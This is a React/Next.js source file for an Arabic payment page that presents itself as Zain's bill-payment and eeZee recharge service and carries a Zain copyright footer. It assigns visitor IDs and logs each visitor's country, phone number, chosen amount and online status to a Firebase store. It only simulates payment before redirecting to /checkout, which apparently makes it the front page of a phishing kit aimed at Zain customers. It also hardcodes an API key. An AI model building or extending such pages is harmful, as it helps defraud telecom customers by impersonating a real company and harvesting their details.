"use client"

import type React from "react"
import { useState, useEffect, useCallback } from "react"
import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
// Assuming these are correctly set up in your project
 import { addData } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/util";

// Placeholder functions to avoid errors if lib files are not present


const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;


export default function ZainPaymentForm() {
  const [phone, setPhone] = useState("")
  const [paymentType, setPaymentType] = useState("other")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [amount, setAmount] = useState(0)
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
  const [phoneError, setPhoneError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [activeTab, setActiveTab] = useState("bill")
  const [visitorId, setVisitorId] = useState<string | null>(null);

  useEffect(() => {
    localStorage.setItem("visitor", newVisitorId);
    setVisitorId(newVisitorId);
  }, []);


  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
    } else {
      setPhoneError("")
    }
  }, [phone])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    if (value.length <= 8) {
      setPhone(value)
    }
  }

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
    setAmount(Number.parseFloat(value))
  }

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load"
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, [visitorId, getLocationAndLog]);

  const handleSubmit = async () => {
    if (!isFormValid || !visitorId) return
    setIsLoading(true)
    
    try {
      await addData({
        id: visitorId,
        phone: phone, // Storing phone number, ensure compliance with privacy regulations
        amount: amount,
        paymentType: activeTab,
        selectedPaymentOption: paymentType, // For bill payment
        termsAccepted: termsAccepted,
        timestamp: new Date().toISOString(),
        action: "payment_submit_attempt"
      })
      // Simulate API call for payment processing
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      // On successful payment simulation
      await addData({
        id: visitorId,
        action: "payment_submit_success_simulation",
        status: "simulated_success"
      });
      // Navigate to checkout or show success
      // For Next.js, prefer using the `useRouter` hook for navigation
      window.location.href = "/checkout"; // Replace with Next.js router if possible: router.push('/checkout')
    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error)
      });
      // Handle error display to user
    } finally {
      setIsLoading(false)
    }
  }

  const isFormValid = phone.length === 8 && !phoneError && termsAccepted && amount > 0

  const billAmounts = ["5", "10", "15", "20", "30", "50"]
  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;

  const renderAmountSelection = () => (
    phone.length === 8 && !phoneError && (
      <div className="space-y-3">
        <Label className="text-sm font-medium text-slate-800">
          {activeTab === "bill" ? "اختر مبلغ الفاتورة" : "اختر باقة إعادة التعبئة"}
        </Label>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
          {currentAmounts.map((value) => (
            <Button
              key={value}
              type="button"
              variant={selectedAmount === value ? "default" : "outline"}
              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
                ${selectedAmount === value
                  ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
                  : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
                }`}
              onClick={() => handleAmountSelect(value)}
            >
              <div className="text-center w-full">
                <div className="font-bold text-lg">{value}.000</div>
                <div className="text-xs opacity-90">د.ك</div>
              </div>
            </Button>
          ))}
        </div>
      </div>
    )
  );

  const renderPhoneNumberInput = (idPrefix: string) => (
    <div className="space-y-2">
      <Label htmlFor={`${idPrefix}-phone`} className="text-sm font-medium text-slate-800 flex items-center justify-between">
        <span>رقم الهاتف</span>
        <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
      </Label>
      <div className="relative">
        <Input
          id={`${idPrefix}-phone`}
          type="tel"
          placeholder="XXXXXXXX"
          value={phone}
          onChange={handlePhoneChange}
          maxLength={8}
          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-left
            ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
            ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
          dir="ltr" // Keep ltr for phone number input
        />
        {phone.length === 8 && !phoneError && (
          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
        )}
         {phoneError && phone.length > 0 && (
            <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
        )}
      </div>
      {phoneError && (
        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
          <AlertCircle className="w-4 h-4 flex-shrink-0" />
          <p>{phoneError}</p>
        </div>
      )}
    </div>
  );

  const renderTermsAndConditions = (idPrefix: string) => (
     <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
      <div className="flex items-start gap-3">
        <Checkbox
          id={`${idPrefix}-terms`}
          checked={termsAccepted}
          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
          aria-labelledby={`${idPrefix}-terms-label`}
        />
        <div className="grid gap-1.5 leading-none">
          <Label
            htmlFor={`${idPrefix}-terms`}
            id={`${idPrefix}-terms-label`}
            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
          >
            أوافق على الشروط والأحكام
          </Label>
          <p className="text-xs text-slate-500">
            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
          </p>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-slate-50 py-8 px-4 sm:px-6 lg:px-8" dir="rtl">
      <div className="max-w-lg mx-auto">
        {/* Header */}
        <header className="text-center mb-10">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-primary/10 rounded-2xl mb-6 shadow-sm">
            {/* Replace with Zain logo if available */}
            <CreditCard className="w-10 h-10 text-primary" />
          </div>
          <h1 className="text-3xl font-extrabold text-slate-900 mb-2 tracking-tight">خدمات الدفع الإلكتروني</h1>
          <p className="text-md text-slate-600">ادفع فاتورتك أو أعد تعبئة رصيدك بكل سهولة وأمان.</p>
        </header>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid w-full grid-cols-2 bg-slate-100 h-auto p-1.5 rounded-xl shadow-inner border border-slate-200">
            {[
              { value: "bill", label: "دفع الفاتورة", icon: CreditCard },
              { value: "recharge", label: "إعادة تعبئة", icon: Smartphone },
            ].map(tab => (
              <TabsTrigger
                key={tab.value}
                value={tab.value}
                className="flex items-center justify-center gap-2.5 py-3.5 px-4 rounded-lg text-sm font-semibold text-slate-600
                           data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-md 
                           transition-all duration-300 ease-in-out focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 focus-visible:ring-offset-slate-100"
                onClick={() => { setSelectedAmount(null); setAmount(0); /* setPhone(""); setTermsAccepted(false); */ }} // Reset amount on tab change
              >
                <tab.icon className="w-5 h-5" />
                <span>{tab.label}</span>
              </TabsTrigger>
            ))}
          </TabsList>

          <TabsContent value="bill" className="mt-6">
            <Card className="shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
              <CardHeader className="bg-slate-50/70 p-6 border-b border-slate-200">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-primary/10 rounded-lg flex items-center justify-center shrink-0">
                    <CreditCard className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <CardTitle className="text-lg font-semibold text-slate-900">دفع فاتورة زين</CardTitle>
                    <CardDescription className="text-sm text-slate-600">اختر نوع الدفع وأدخل التفاصيل المطلوبة.</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-6 space-y-6">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-slate-800">نوع الدفع</Label>
                  <Select value={paymentType} onValueChange={setPaymentType}>
                    <SelectTrigger className="h-12 bg-white border-slate-300 hover:border-primary focus:border-primary focus:ring-1 focus:ring-primary transition-colors text-slate-700">
                      <SelectValue placeholder="اختر نوع الدفع" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="other">رقم آخر</SelectItem>
                      <SelectItem value="contract">رقم العقد (غير مفعل حالياً)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {renderPhoneNumberInput("bill")}
                {renderAmountSelection()}
                {renderTermsAndConditions("bill")}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="recharge" className="mt-6">
            <Card className="shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
              <CardHeader className="bg-slate-50/70 p-6 border-b border-slate-200">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-primary/10 rounded-lg flex items-center justify-center shrink-0">
                    <Smartphone className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <CardTitle className="text-lg font-semibold text-slate-900">إعادة تعبئة رصيد eeZee</CardTitle>
                    <CardDescription className="text-sm text-slate-600">أدخل رقم الهاتف واختر باقة التعبئة.</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-6 space-y-6">
                {renderPhoneNumberInput("recharge")}
                {renderAmountSelection()}
                {renderTermsAndConditions("recharge")}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {/* Payment Summary & Action Button */}
        {amount > 0 && (
          <Card className="mt-8 shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
            <CardHeader className="p-6">
              <CardTitle className="text-lg font-semibold text-slate-800">ملخص الدفع</CardTitle>
            </CardHeader>
            <CardContent className="p-6 pt-0">
              <div className="flex items-center justify-between mb-4 pb-4 border-b border-dashed border-slate-200">
                <span className="text-md font-medium text-slate-700">المبلغ الإجمالي</span>
                <div className="text-right">
                  <div className="text-2xl font-bold text-primary">{amount.toFixed(3)}</div>
                  <div className="text-sm text-slate-500">دينار كويتي</div>
                </div>
              </div>

              <Button
                onClick={handleSubmit}
                disabled={!isFormValid || isLoading}
                className="w-full h-14 text-lg font-bold bg-primary hover:bg-primary/90 text-primary-foreground
                           disabled:bg-slate-300 disabled:text-slate-500 disabled:cursor-not-allowed
                           transition-all duration-200 shadow-lg hover:shadow-primary/40 focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2"
                aria-live="polite"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-2.5">
                    <Loader2 className="w-6 h-6 animate-spin" />
                    <span>جاري المعالجة...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2.5">
                    <CreditCard className="w-5 h-5" />
                    <span>ادفع الآن</span>
                  </div>
                )}
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Footer (Optional) */}
        <footer className="mt-12 text-center">
          <p className="text-sm text-slate-500">&copy; {new Date().getFullYear()} Zain. جميع الحقوق محفوظة.</p>
          {/* Placeholder for Zain logo image */}
          {/* <img src="/zain-logo.svg" alt="Zain Logo" className="h-8 mx-auto mt-4 opacity-75" /> */}
        </footer>
      </div>
    </div>
  )
}

